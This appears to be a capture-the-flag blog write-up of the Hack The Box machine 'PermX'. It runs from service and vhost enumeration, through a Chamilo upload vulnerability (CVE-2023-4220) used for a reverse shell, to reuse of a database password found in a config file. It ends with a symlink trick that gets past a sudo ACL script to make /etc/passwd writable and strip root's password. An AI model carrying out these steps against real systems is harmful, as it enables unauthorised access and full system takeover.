+++
title = 'Permx'
date = 2024-08-24T16:50:47-04:00
draft = false
tags = ["linux"]
category = ["htb"]
summary = "HTB - Linux - Easy"
+++


# Enum
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


# 80/permx.htb
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Nmap picks up a hostname we need to add to our hosts file `permx.htb`

```bash
┌──(fish㉿kali)-[~/htb/sherlocks/noxious]
└─$ whatweb permx.htb     
http://permx.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.23], JQuery[3.4.1], Script, Title[eLEARNING]
```

Next up is directory enum and vhost enum

```bash
# ffuf vhost discovery filtering out status codes 302
┌──(fish㉿kali)-[~/htb/sherlocks/noxious]
└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u $URL -H 'Host: FUZZ.permx.htb' -fc 302
...
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 37ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 71ms]

```

Vhost discovery gets us two, `www` and `lms`. Nothing interesting from the initial dir enumeration of permx.htb. Maybe one of the vhosts.

```bash
┌──(fish㉿kali)-[~/htb/sherlocks/noxious]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t 50 -x php --exclude-length 274 
...
/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]
/lib                  (Status: 301) [Size: 304] [--> http://permx.htb/lib/]
/.                    (Status: 200) [Size: 36182]
/js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]

```


## lms.permx.htb

```bash
# added to /etc/hosts
┌──(fish㉿kali)-[~/htb/sherlocks/noxious]
└─$ URL=http://lms.permx.htb 

...

┌──(fish㉿kali)-[~/htb/sherlocks/noxious]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t 50 -x php -b 404,403 
...
/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
/user.php             (Status: 302) [Size: 0] [--> whoisonline.php]
/index.php            (Status: 200) [Size: 19356]
/LICENSE              (Status: 200) [Size: 35147]
/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
/terms.php            (Status: 200) [Size: 16127]
/.                    (Status: 200) [Size: 19348]
/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
/plugin               (Status: 301) [Size: 315] [--> http://lms.permx.htb/plugin/]
/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
/vendor               (Status: 301) [Size: 315] [--> http://lms.permx.htb/vendor/]
/certificates         (Status: 301) [Size: 321] [--> http://lms.permx.htb/certificates/]
/news_list.php        (Status: 200) [Size: 13995]
/custompages          (Status: 301) [Size: 320] [--> http://lms.permx.htb/custompages/]
/whoisonline.php      (Status: 200) [Size: 15471]
/user_portal.php      (Status: 200) [Size: 16154]

```


`Powered by chamilo` 

There's a recent CVE for chamilo >>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220

Checking out to see if the bigUpload.php file exists, at `http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported`, it appears it does.


---
# Foothold

Wrote a python script to get a reverse shell with the upload vulnerability

https://github.com/thefizzyfish/CVE-2023-4220


```bash
www-data@permx:/var/www/chamilo/app/config$ cat configuration.php
...
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
...
```

Found a config file with a potential db password. Looking at the /home directory there's another user we can try the cred for `mtz`.

```bash
┌──(fish㉿kali)-[~/htb/permx/CVE-2023-4220]
└─$ ssh mtz@10.10.11.23   
...
Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
mtz@permx:~$ 

```

And we got user with `mtz:03F6lY3uXAP2bkW8`
## Exploits
https://github.com/thefizzyfish/CVE-2023-4220
#CVE-2023-4220


--- 
# PrivEsc

Since we have a password for `mtz` first step is to check sudo privs with `sudo -l`


We can run /opt/acl.sh.

```bash
mtz@permx:/opt$ cat acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```

There's a filter blocking us from specifying a path outside of `/home/mtz` or including `..` within the path. We can get around this by sym-linking to another file and running the command.

In this case I gave mtz control of the passwd file, we can remove the password for root by removing the x after the `root:`

```bash
mtz@permx:~$ ln -s /etc/passwd passwd.txt
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd.txt
mtz@permx:~$ head passwd.txt 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
mtz@permx:~$ 

```




## Exploits


---


# Post/Pivot



---




